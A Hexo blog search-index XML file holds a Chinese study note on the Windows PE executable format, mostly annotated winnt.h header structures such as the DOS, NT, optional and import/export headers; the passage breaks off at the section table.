<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PE结构学习</title>
      <link href="/2022/06/12/PE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/06/12/PE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇是关于PE结构学习的笔记,参考了两篇文章做了个综合</p><span id="more"></span><h2 id="PE文件解析"><a href="#PE文件解析" class="headerlink" title="PE文件解析"></a>PE文件解析</h2><h3 id="0x01可执行文件"><a href="#0x01可执行文件" class="headerlink" title="0x01可执行文件"></a>0x01可执行文件</h3><p>文件格式一般是指数据信息在计算机中存储的格式,不同计算机操作系统,不同应用的文件,在计算机中存储都有可能是不同的</p><p>可执行文件:一般是指可以被计算机操作系统识别并执行的文件</p><blockquote><p>windows: 采用PE(Portable Executable)格式</p><p>linux:采用ELF(Executable and Linking Format)格式</p></blockquote><h3 id="0x02-PE文件格式"><a href="#0x02-PE文件格式" class="headerlink" title="0x02 PE文件格式"></a>0x02 PE文件格式</h3><p>PE文件,常见的如:exe,dll,ocx,sys,com等文件后缀的文件都属于PE格式</p><h3 id="0x03-地址的基本概念"><a href="#0x03-地址的基本概念" class="headerlink" title="0x03 地址的基本概念"></a>0x03 地址的基本概念</h3><p><strong>VA</strong>（Virtual Address）：虚拟地址<br>PE 文件映射到内存空间时，数据在内存空间中对应的地址。</p><p><strong>ImageBase</strong>：映射基址<br>PE 文件在内存空间中的映射起始位置，是个 VA 地址。</p><p><strong>RVA</strong>（Relative Virtual Address）：相对虚拟地址<br>PE 文件在内存中的 VA 相对于 ImageBase 的偏移量。</p><p><strong>FOA</strong>（File Offset Address，FOA）：文件偏移地址<br>PE 文件在磁盘上存放时，数据相对于文件开头位置的偏移量，文件偏移地址等于文件地址。</p><p><strong>节偏移</strong> : 节偏移&#x3D;RVA-文件偏移</p><blockquote><p>转换关系：<strong>VA &#x3D; ImageBase + RVA</strong></p><p><strong>文件偏移地址 &#x3D; VA – ImageBase – 节偏移 &#x3D; RVA – 节偏移</strong></p></blockquote><h3 id="0x04-PE文件格式"><a href="#0x04-PE文件格式" class="headerlink" title="0x04 PE文件格式"></a>0x04 PE文件格式</h3><p><img src="/PE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/1631526105_613f1cd909dbf1e79d713-16550184386675.jpg" alt="PE 文件结构"></p><img src="/2022/06/12/PE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/1631526105_613f1cd909dbf1e79d713-16550184386675.jpg" class="" title="PE结构"><h3 id="0x05-DOS头"><a href="#0x05-DOS头" class="headerlink" title="0x05 DOS头"></a>0x05 DOS头</h3><p>DOS头在<code>winnt.h</code>文件中定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_IMAGE_DOS_HEADER</span> &#123; <span class="hljs-comment">// DOS的.EXE头部</span><br>  USHORT e_magic;  <span class="hljs-string">&#x27;// DOS签名“MZ--&gt;Mark Zbikowski（设计了DOS的工程师）” -&gt; 4D 5A &#x27;</span><br>  USHORT e_cblp;    <span class="hljs-comment">// 文件最后页的字节数 -&gt; 00 90 -&gt; 144</span><br>  USHORT e_cp;      <span class="hljs-comment">// 文件页数 -&gt; 00 30 -&gt; 48</span><br>  USHORT e_crlc;    <span class="hljs-comment">// 重定义元素个数 -&gt; 00 00</span><br>  USHORT e_cparhdr; <span class="hljs-comment">// 头部尺寸，以段落为单位 -&gt; 00 04</span><br>  USHORT e_minalloc; <span class="hljs-comment">// 所需的最小附加段 -&gt; 00 00</span><br>  USHORT e_maxalloc; <span class="hljs-comment">// 所需的最大附加段 -&gt; FF FF</span><br>  USHORT e_ss;       <span class="hljs-comment">// 初始的SS值（相对偏移量） -&gt; 00 00</span><br>  USHORT e_sp;       <span class="hljs-comment">// 初始的SP值 -&gt; 00 B8 -&gt; 184</span><br>  USHORT e_csum;     <span class="hljs-comment">// 校验和 -&gt; 00 00</span><br>  USHORT e_ip;       <span class="hljs-comment">// 初始的IP值 -&gt; 00 00</span><br>  USHORT e_cs;       <span class="hljs-comment">// 初始的CS值（相对偏移量） -&gt; 00 00</span><br>  USHORT e_lfarlc;   <span class="hljs-comment">// 重分配表文件地址 -&gt; 00 40 -&gt; 64</span><br>  USHORT e_ovno;     <span class="hljs-comment">// 覆盖号 -&gt; 00 00</span><br>  USHORT e_res[<span class="hljs-number">4</span>];   <span class="hljs-comment">// 保留字 -&gt; 00 00 00 00 00 00 00 00</span><br>  USHORT e_oemid;    <span class="hljs-comment">// OEM标识符（相对e_oeminfo） -&gt; 00 00</span><br>  USHORT e_oeminfo;  <span class="hljs-comment">// OEM信息 -&gt; 00 00</span><br>  USHORT e_res2[<span class="hljs-number">10</span>]; <span class="hljs-comment">// 保留字 -&gt; 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br>  LONG e_lfanew;    <span class="hljs-string">&#x27;// 指示NT头的偏移（根据不同文件拥有可变值） -&gt; 00 00 00 C0 -&gt; 192&#x27;</span> PE头对于文件的偏移地址<br>&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; <br></code></pre></td></tr></table></figure><p>DOS头 占用<strong>64字节</strong></p><p>dos头是PE文件结构的第一个头，用于保存对DOS系统的兼容，并且用于定位真正的PE头。图中的<code>B0 00 00 00</code>也就是<code>e_lfanew</code>指向了PE头的偏移。</p><p>查看<code>e_lfanew</code>指向位置是否为<code>50 45 00 00</code>即可判断是否为一个PE文件。</p><p>DOS头中<code>4D 5A</code>到<code>e_lfanew</code>即<code>B0 00 00 00</code>中间数据和<code>e_lfanew</code>到指向PE头偏移位置可有可无。</p><h3 id="0x06-DOS-STUB"><a href="#0x06-DOS-STUB" class="headerlink" title="0x06 DOS_STUB"></a>0x06 DOS_STUB</h3><p><strong>_IMAGE_DOS_STUB 结构：</strong><br>该结构未在 winnt.h 中定义，其内容随着链接时使用的链接器不同而不同，通常用于保存在 DOS 环境中的可执行代码。<br>例如：该结构中的代码用于显示字符串：”This program cannot run in DOS mode”。</p><h3 id="0x07-NT-HEADER"><a href="#0x07-NT-HEADER" class="headerlink" title="0x07 NT_HEADER"></a>0x07 NT_HEADER</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_IMAGE_NT_HEADERS64</span> &#123;<br>    DWORD Signature;   <span class="hljs-comment">// 类似于DOS头中的e_magic -&gt; 00 00 45 50 -&gt; PE标识符</span><br>    IMAGE_FILE_HEADER FileHeader; <span class="hljs-comment">// IMAGE_FILE_HEADER是PE文件头，定义如下</span><br>    IMAGE_OPTIONAL_HEADER64 OptionalHeader;  <span class="hljs-comment">// 可选头</span><br>&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_IMAGE_NT_HEADERS</span> &#123;<br>    DWORD Signature;  <span class="hljs-comment">// 类似于DOS头中的e_magic -&gt; 00 00 45 50 -&gt; PE标识符</span><br>    IMAGE_FILE_HEADER FileHeader;  <span class="hljs-comment">// IMAGE_FILE_HEADER是PE文件头，定义如下</span><br>    IMAGE_OPTIONAL_HEADER32 OptionalHeader;  <span class="hljs-comment">// 可选头</span><br>&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-keyword">typedef</span> IMAGE_NT_HEADERS64                  IMAGE_NT_HEADERS;<br><span class="hljs-keyword">typedef</span> PIMAGE_NT_HEADERS64                 PIMAGE_NT_HEADERS;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">typedef</span> IMAGE_NT_HEADERS32                  IMAGE_NT_HEADERS;<br><span class="hljs-keyword">typedef</span> PIMAGE_NT_HEADERS32                 PIMAGE_NT_HEADERS;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>PE 文件使用 _IMAGE_NT_HEADER 结构提供程序在 Windows 系统中的执行环境。<br>可以看到 _IMAGE_NT_HEADER 结构针对 32 位和 64 位有不同的定义。</p><h3 id="0x08-FILE-HEADER"><a href="#0x08-FILE-HEADER" class="headerlink" title="0x08 FILE_HEADER"></a>0x08 FILE_HEADER</h3><ul><li><strong>IMAGE_FILE_HEADER</strong>：其中有4个重要的成员，若设置不正确，将会导致文件无法正常运行。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_IMAGE_FILE_HEADER</span> &#123; <br>        WORD    Machine;              <span class="hljs-string">&#x27;// 每个CPU拥有唯一的Machine码 -&gt; 4C 01 -&gt; PE -&gt; 兼容32位Intel X86芯片&#x27;</span><br><br>        WORD    NumberOfSections;     <span class="hljs-string">&#x27;// 指文件中存在的节段（又称节区）数量，也就是节表中的项数 -&gt; 00 04 -&gt; 4</span><br><span class="hljs-string">                                       // 该值一定要大于0，且当定义的节段数与实际不符时，将发生运行错误。&#x27;</span><br><br>        DWORD   TimeDateStamp;         <span class="hljs-comment">// PE文件的创建时间，一般有连接器填写 -&gt; 38 D1 29 1E</span><br>        DWORD   PointerToSymbolTable;  <span class="hljs-comment">// COFF 符号表的 RVA 偏移量，如果 COFF 符号表不存在，则该值为 -&gt; 00 00 00 00</span><br>        DWORD   NumberOfSymbols;       <span class="hljs-comment">// 符号表的数量 -&gt; 00 00 00 00</span><br><br>        WORD    SizeOfOptionalHeader; <span class="hljs-string">&#x27;// 指出IMAGE_OPTIONAL_HEADER32结构体的长度。-&gt;  00 E0 -&gt; 224字节</span><br><span class="hljs-string">                                       // PE32+格式文件中使用的是IMAGE_OPTIONAL_HEADER64结构体，</span><br><span class="hljs-string">                                       // 这两个结构体尺寸是不相同的，所以需要在SizeOfOptionalHeader中指明大小。&#x27;</span><br><br>        WORD    Characteristics;      <span class="hljs-string">&#x27;// 标识文件的属性，exe则为010f dll文件则为210e</span><br><span class="hljs-string">                              </span><br><span class="hljs-string">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></code></pre></td></tr></table></figure><h3 id="0x09-可选头-OPTIONAL-HEADER"><a href="#0x09-可选头-OPTIONAL-HEADER" class="headerlink" title="0x09 可选头:OPTIONAL_HEADER"></a>0x09 可选头:OPTIONAL_HEADER</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_IMAGE_OPTIONAL_HEADER</span> &#123; <br>    <span class="hljs-comment">//standard fields</span><br>        WORD    Magic;                     <span class="hljs-string">&#x27;// 魔数 32位为0x10B，64位为0x20B，ROM镜像为0x107&#x27;</span><br>        BYTE    MajorLinkerVersion;         <span class="hljs-comment">// 链接器的主版本号 -&gt; 05</span><br>        BYTE    MinorLinkerVersion;         <span class="hljs-comment">// 链接器的次版本号 -&gt; 0C</span><br>        DWORD   SizeOfCode;                 <span class="hljs-comment">// 代码节大小，一般放在“.text”节里，必须是FileAlignment的整数倍 -&gt; 40 00 04 00</span><br>        DWORD   SizeOfInitializedData;      <span class="hljs-comment">// 已初始化数大小，一般放在“.data”节里，必须是FileAlignment的整数倍 -&gt; 40 00 0A 00</span><br>        DWORD   SizeOfUninitializedData;    <span class="hljs-comment">// 未初始化数大小，一般放在“.bss”节里，必须是FileAlignment的整数倍 -&gt; 00 00 00 00</span><br>        DWORD   AddressOfEntryPoint;       <span class="hljs-string">&#x27;// 指出程序最先执行的代码起始地址(RVA) -&gt; 00 00 10 00&#x27;</span>,对于dll文件来说如果没有入口函数这个值为<span class="hljs-number">0</span>，对于驱动该值时初始化函数的地址。<br>        DWORD   BaseOfCode;                 <span class="hljs-comment">// 代码基址，当镜像被加载进内存时代码节的开头RVA。必须是SectionAlignment的整数倍 -&gt; 40 00 10 00</span><br><br>        DWORD   BaseOfData;                 <span class="hljs-comment">// 数据基址，当镜像被加载进内存时数据节的开头RVA。必须是SectionAlignment的整数倍 -&gt; 40 00 20 00</span><br>                                            <span class="hljs-comment">// 在64位文件中此处被并入紧随其后的ImageBase中。</span><br><br>        DWORD   ImageBase;                 <span class="hljs-string">&#x27;// 当加载进内存时，镜像的第1个字节的首选地址。</span><br><span class="hljs-string">                                            // WindowEXE默认ImageBase值为00400000，DLL文件的ImageBase值为10000000，也可以指定其他值。</span><br><span class="hljs-string">                                            // 执行PE文件时，PE装载器先创建进程，再将文件载入内存，</span><br><span class="hljs-string">                                            // 然后把EIP寄存器的值设置为ImageBase+AddressOfEntryPoint&#x27;</span><br><span class="hljs-comment">//NT additional fields</span><br>                                           <span class="hljs-string">&#x27;// PE文件的Body部分被划分成若干节段，这些节段储存着不同类别的数据。&#x27;</span><br>        DWORD   SectionAlignment;          <span class="hljs-string">&#x27;// SectionAlignment指定了节段在内存中的最小单位， -&gt; 00 00 10 00&#x27;</span><br>        DWORD   FileAlignment;             <span class="hljs-string">&#x27;// FileAlignment指定了节段在磁盘文件中的最小单位，-&gt; 00 00 02 00</span><br><span class="hljs-string">                                            // SectionAlignment必须大于或者等于FileAlignment&#x27;</span><br><br>        WORD    MajorOperatingSystemVersion;<span class="hljs-comment">// 主系统的主版本号 -&gt; 00 04</span><br>        WORD    MinorOperatingSystemVersion;<span class="hljs-comment">// 主系统的次版本号 -&gt; 00 00</span><br>        WORD    MajorImageVersion;          <span class="hljs-comment">// 镜像的主版本号 -&gt; 00 00</span><br>        WORD    MinorImageVersion;          <span class="hljs-comment">// 镜像的次版本号 -&gt; 00 00</span><br>        WORD    MajorSubsystemVersion;      <span class="hljs-comment">// 子系统的主版本号 -&gt; 00 04</span><br>        WORD    MinorSubsystemVersion;      <span class="hljs-comment">// 子系统的次版本号 -&gt; 00 00</span><br>        DWORD   Win32VersionValue;          <span class="hljs-comment">// 保留，必须为0 -&gt; 00 00 00 00</span><br><br>        DWORD   SizeOfImage;               <span class="hljs-string">&#x27;// 当镜像被加载进内存时的大小，包括所有的文件头。向上舍入为SectionAlignment的倍数。</span><br><span class="hljs-string">                                            // 一般文件大小与加载到内存中的大小是不同的。 -&gt; 00 00 50 00&#x27;</span><br><br>        DWORD   SizeOfHeaders;             <span class="hljs-string">&#x27;// 所有头的总大小，向上舍入为FileAlignment的倍数。</span><br><span class="hljs-string">                                            // 可以以此值作为PE文件第一节的文件偏移量。-&gt; 00 00 04 00&#x27;</span><br><br>        DWORD   CheckSum;                   <span class="hljs-comment">// 镜像文件的校验和 -&gt; 00 00 B4 99</span><br><br>        WORD    Subsystem;                 <span class="hljs-string">&#x27;// 运行此镜像所需的子系统 -&gt; 00 02 -&gt; 窗口应用程序</span><br><span class="hljs-string">                                            // 用来区分系统驱动文件（*.sys)与普通可执行文件（*.exe，*.dll），</span><br><span class="hljs-string">                                            // 参考：https://blog.csdn.net/qiming_zhang/article/details/7309909#3.2.3&#x27;</span><br><br>        WORD    DllCharacteristics;         <span class="hljs-comment">// DLL标识 -&gt; 00 00</span><br>        DWORD   SizeOfStackReserve;         <span class="hljs-comment">// 最大栈大小。CPU的堆栈。默认是1MB。-&gt; 00 10 00 00</span><br>        DWORD   SizeOfStackCommit;          <span class="hljs-comment">// 初始提交的堆栈大小。默认是4KB -&gt; 00 00 10 00</span><br>        DWORD   SizeOfHeapReserve;          <span class="hljs-comment">// 最大堆大小。编译器分配的。默认是1MB -&gt;00 10 00 00</span><br>        DWORD   SizeOfHeapCommit;           <span class="hljs-comment">// 初始提交的局部堆空间大小。默认是4K -&gt;00 00 10 00</span><br>        DWORD   LoaderFlags;                <span class="hljs-comment">// 保留，必须为0 -&gt; 00 00 00 00</span><br><br>        DWORD   NumberOfRvaAndSizes;       <span class="hljs-string">&#x27;// 指定DataDirectory的数组个数，由于以前发行的Windows NT的原因，它只能为16。 -&gt; 00 00 00 10&#x27;</span><br>        IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <span class="hljs-string">&#x27;// 数据目录数组。详见下文。&#x27;</span> <br>    &#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;<br><span class="hljs-comment">//下面是64位的 含义都差不多只是有些 成员所占空间大小不同</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_IMAGE_OPTIONAL_HEADER64</span> &#123;<br>    WORD        Magic;<br>    BYTE        MajorLinkerVersion;<br>    BYTE        MinorLinkerVersion;<br>    DWORD       SizeOfCode;<br>    DWORD       SizeOfInitializedData;<br>    DWORD       SizeOfUninitializedData;<br>    DWORD       AddressOfEntryPoint;<br>    DWORD       BaseOfCode;<br>    ULONGLONG   ImageBase;<br>    DWORD       SectionAlignment;<br>    DWORD       FileAlignment;<br>    WORD        MajorOperatingSystemVersion;<br>    WORD        MinorOperatingSystemVersion;<br>    WORD        MajorImageVersion;<br>    WORD        MinorImageVersion;<br>    WORD        MajorSubsystemVersion;<br>    WORD        MinorSubsystemVersion;<br>    DWORD       Win32VersionValue;<br>    DWORD       SizeOfImage;<br>    DWORD       SizeOfHeaders;<br>    DWORD       CheckSum;<br>    WORD        Subsystem;<br>    WORD        DllCharacteristics;<br>    ULONGLONG   SizeOfStackReserve;<br>    ULONGLONG   SizeOfStackCommit;<br>    ULONGLONG   SizeOfHeapReserve;<br>    ULONGLONG   SizeOfHeapCommit;<br>    DWORD       LoaderFlags;<br>    DWORD       NumberOfRvaAndSizes;<br>    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<br>&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-keyword">typedef</span> IMAGE_OPTIONAL_HEADER64             IMAGE_OPTIONAL_HEADER;<br><span class="hljs-keyword">typedef</span> PIMAGE_OPTIONAL_HEADER64            PIMAGE_OPTIONAL_HEADER;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br></code></pre></td></tr></table></figure><p>来看到<code>AddressOfEntryPoint</code> 和<code>ImageBase</code>，<code>ImageBase</code>是一个内存的虚拟地址，而<code>AddressOfEntryPoint</code>是相对虚拟地址。真正可执行文件的虚拟地址是<code>ImageBase</code>+<code>AddressOfEntryPoint</code>。但并不是绝对的因为<code>ImageBase</code>是建议装载地址。如果装载地址已经被使用过了系统会重新分配一块内存。</p><h3 id="0x10-数据目录表"><a href="#0x10-数据目录表" class="headerlink" title="0x10 数据目录表"></a>0x10 数据目录表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_IMAGE_DATA_DIRECTORY</span> &#123;<br>    DWORD   VirtualAddress; <span class="hljs-comment">//数据结构（表）的起始 RVA 偏移地址。</span><br>    DWORD   Size; <span class="hljs-comment">//数据结构（表）的大小。</span><br>&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;<br></code></pre></td></tr></table></figure><p>PE 文件使用 _IMAGE_DATA_DIRECTORY 结构提供 PE 文件中数据结构（输入表、输出表等）的地址和大小信息。</p><p><strong>DataDirectory[] 数据目录数组</strong>：数组每项都有被定义的值，不同项对应不同数据结构。重点关注的IMPORT和EXPORT，它们是PE头中的非常重要的部分</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT     0 导出表</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT     1 导入表 </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE     2 资源目录</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION     3 异常目录</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY     4 安全目录</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC           5 重定位基本表</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG     6 调试目录</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COPYRIGHT     7 描术字串</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR     8 机器值</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS     9 TLS目录</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG   10 载入配值目录</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT       11 绑定导入表</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT     12 导入地址表</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13 延迟载入描述</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR     14 COM信息</span><br></code></pre></td></tr></table></figure><h3 id="0x11-导出表-EXPORT-DIRECTORY"><a href="#0x11-导出表-EXPORT-DIRECTORY" class="headerlink" title="0x11 导出表:EXPORT_DIRECTORY"></a>0x11 导出表:EXPORT_DIRECTORY</h3><p>一般的简单pe文件并不存在导出表，一般的dll都有导出表，因为写有导出函数可以给到别的pe文件调用功能函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_IMAGE_EXPORT_DIRECTORY</span> &#123;                  <br>    DWORD   Characteristics;        <span class="hljs-comment">// 未使用          </span><br>    DWORD   TimeDateStamp;        <span class="hljs-comment">// 时间戳          </span><br>    WORD    MajorVersion;        <span class="hljs-comment">// 未使用     </span><br>    WORD    MinorVersion;        <span class="hljs-comment">// 未使用         </span><br>    DWORD   Name;        <span class="hljs-comment">// 指向该导出表文件名字符串         </span><br>    DWORD   Base;        <span class="hljs-comment">// 导出函数起始序号          </span><br>    DWORD   NumberOfFunctions;        <span class="hljs-comment">// 所有导出函数的个数         </span><br>    DWORD   NumberOfNames;        <span class="hljs-comment">// 以函数名字导出的函数个数          </span><br>    DWORD   AddressOfFunctions;     <span class="hljs-comment">// 导出函数地址表RVA                  </span><br>    DWORD   AddressOfNames;         <span class="hljs-comment">// 导出函数名称表RVA                  </span><br>    DWORD   AddressOfNameOrdinals;  <span class="hljs-comment">// 导出函数序号表RVA                  </span><br>&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;   <br></code></pre></td></tr></table></figure><h3 id="0x12-导入表-IMPORT-DESCRIPTOR"><a href="#0x12-导入表-IMPORT-DESCRIPTOR" class="headerlink" title="0x12 导入表:IMPORT_DESCRIPTOR"></a>0x12 导入表:IMPORT_DESCRIPTOR</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;                    <br>    <span class="hljs-keyword">union</span> &#123;                    <br>        DWORD   Characteristics;                               <br>        DWORD   OriginalFirstThunk;                     <span class="hljs-comment">//RVA 指向IMAGE_THUNK_DATA结构数组        </span><br>    &#125;;                    <br>    DWORD   TimeDateStamp;                           <span class="hljs-comment">//时间戳        </span><br>    DWORD   ForwarderChain;                                  <br>    DWORD   Name;            <span class="hljs-comment">//RVA,指向dll名字，该名字以 两个字节的0结尾        </span><br>    DWORD   FirstThunk;                             <span class="hljs-comment">//RVA,指向IMAGE_THUNK_DATA结构数组        </span><br>&#125; IMAGE_IMPORT_DESCRIPTOR;                    <br><span class="hljs-keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;  <br></code></pre></td></tr></table></figure><h3 id="0x13-节表-SECTION-HEADER"><a href="#0x13-节表-SECTION-HEADER" class="headerlink" title="0x13 节表:SECTION_HEADER"></a>0x13 节表:SECTION_HEADER</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 